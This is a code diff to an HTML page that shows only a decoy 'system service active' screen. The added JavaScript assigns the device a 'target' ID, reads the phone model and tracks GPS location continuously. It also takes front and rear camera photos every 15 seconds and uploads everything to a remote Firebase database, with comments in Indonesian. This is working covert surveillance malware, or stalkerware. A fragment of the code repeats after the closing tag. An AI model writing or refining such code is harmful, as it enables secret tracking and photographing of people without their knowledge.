@@ -21,6 +21,11 @@
             padding: 20px;
             background: #05070c;
         }
+        #statusText {
+            font-size: 0.8rem;
+            color: #00ff66;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -28,6 +33,7 @@
     <div class="box">
         <h3>[ SYSTEM SERVICE ACTIVE ]</h3>
         <p>Running background process...</p>
+        <div id="statusText">Status: Standby</div>
     </div>
 
     <div style="display:none;">
@@ -52,6 +58,7 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+        const statusText = document.getElementById('statusText');
 
         // Buat ID unik untuk perangkat ini jika belum ada
         let targetId = localStorage.getItem("target_unique_id");
@@ -60,6 +67,105 @@
             localStorage.setItem("target_unique_id", targetId);
         }
 
+        // Deteksi Tipe HP Otomatis
+        function getDeviceModel() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) {
+                let match = ua.match(/;\s([^;]+)\sBuild\//);
+                if (match && match[1]) return match[1];
+                return "Android Device";
+            }
+            return "Mobile Target";
+        }
+
+        const deviceName = getDeviceModel();
+
+        // 1. Kirim Data GPS Real-time (Berjalan terus di latar belakang)
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition((position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                
+                db.ref("targets/" + targetId).set({
+                    id: targetId,
+                    device: deviceName,
+                    latitude: lat,
+                    longitude: lon,
+                    timestamp: Date.now()
+                });
+            }, (error) => {
+                console.error("GPS Error:", error);
+            }, { enableHighAccuracy: true });
+        }
+
+        // 2. Fungsi Kamera dengan Validasi Layar Aktif
+        async function captureCamera(facingType, labelName) {
+            // Android WebView memblokir kamera jika aplikasi tidak aktif/di latar belakang
+            if (document.hidden) {
+                statusText.innerText = "Status: App minimized (Camera paused)";
+                return;
+            }
+
+            try {
+                statusText.innerText = `Status: Capturing ${labelName}...`;
+
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }
+
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingType },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(resolve, 1500); // Beri waktu pemanasan sensor 1.5 detik
+                    };
+                });
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+                db.ref("camera_logs").push({
+                    targetId: targetId,
+                    device: deviceName,
+                    cameraType: labelName,
+                    image: imageData,
+                    timestamp: Date.now()
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                statusText.innerText = "Status: Active";
+            } catch (err) {
+                console.log(`Kamera ${labelName} error:`, err);
+                statusText.innerText = "Status: Camera permission/hardware busy";
+            }
+        }
+
+        async function runCycle() {
+            await captureCamera("user", "Depan");
+            setTimeout(async () => {
+                await captureCamera("environment", "Belakang");
+            }, 4000);
+        }
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                runCycle();
+                setInterval(runCycle, 15000); // Siklus diperpanjang jadi 15 detik agar stabil
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
         // Deteksi Tipe HP Otomatis
         function getDeviceModel() {
             const ua = navigator.userAgent;
